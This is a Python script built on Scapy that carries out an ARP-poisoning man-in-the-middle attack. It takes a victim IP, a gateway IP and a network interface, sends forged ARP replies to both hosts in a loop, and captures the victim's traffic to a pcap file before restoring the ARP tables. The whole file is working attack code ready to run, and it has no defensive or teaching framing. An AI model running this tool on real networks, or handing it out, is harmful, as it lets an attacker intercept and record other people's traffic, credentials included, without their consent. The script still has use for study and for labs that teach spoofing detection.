from multiprocessing import Process
from scapy.all import (ARP,Ether,conf,send,sniff,srp,wrpcap,get_if_hwaddr,sndrcv)
import os
import sys
import time


# get mac address of ip address
def get_mac(target):
    packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op='who-has',pdst=target)
    resp,_ = srp(packet,timeout=2,retry=10,verbose=False)
    for _,r in resp:
        return r[Ether].src
    return None


class Arper:
    def __init__(self,victim,gateway,interface='eth0'):
        self.victim = victim;
        self.victimmac = get_mac(self.victim)
        self.gateway = gateway;
        self.gatewaymac = get_mac(self.gateway)
        self.interface = interface;
        conf.iface = self.interface
        conf.verb = 0

        print(f'Initialized {interface}:')
        print(f'{self.gateway} on {self.gatewaymac}')
        print(f'{self.victim} on {self.victimmac}')
        print('-'*30)

    
    def run(self):
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()

        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()
    
    # poison victim and gateway 	
    def poison(self):
        poison_victim = ARP()
        poison_victim.op = 2
        poison_victim.psrc = self.gateway
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.victimmac

        print(f'ip src: {poison_victim.psrc}')
        print(f'ip dst: {poison_victim.pdst}')
        print(f'mac dst: {poison_victim.hwdst}')
        print(f'mac src: {poison_victim.hwsrc}')
        print(poison_victim.summary())
        print('-'*30)

        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = self.victim
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.gatewaymac

        print(f'ip src:{poison_gateway.psrc}')
        print(f'ip dst:{poison_gateway.pdst}')
        print(f'mac src:{poison_gateway.hwsrc}')
        print(f'mac dst:{poison_gateway.hwdst}')
        print(poison_gateway.summary())
        print('-'*30)

        print(f'Beginning the ARP poisning [ctr+C to stop]')

        while True:
            sys.stdout.write('.')
            sys.stdout.flush()

            try:
                send(poison_gateway)
                send(poison_victim)
            except KeyboardInterrupt:
                self.restore()
                sys.exit()
            else:
                time.sleep(2)
    

    def sniff(self,count=100):
        time.sleep(5)
        print(f'Sniffing {count} packets')
        bpf_filter = "ip host %s" %self.victim
        packets = sniff(count=count,filter=bpf_filter,iface=self.interface)
        wrpcap('arper.pcap',packets)
        print('Got the packets')
        self.restore()
        self.poison_thread.terminate()
        print('Finished')
    
    def restore(self):
        print('Restoring ARP tables....')
        send(ARP(
            op = 2,
            psrc = self.gateway,
            pdst = self.victim,
            hwsrc = self.gatewaymac,
            hwdst = 'ff:ff:ff:ff:ff:ff'
        ),count=5)

        send(ARP(
            op = 2,
            psrc = self.victim,
            pdst = self.gateway,
            hwsrc = self.victimmac,
            hwdst = 'ff:ff:ff:ff:ff:ff'
        ),count=5)


if __name__=="__main__":
    (victim,gateway,interface) = (sys.argv[1],sys.argv[2],sys.argv[3])
    myarp = Arper(victim,gateway,interface)
    myarp.run()

        




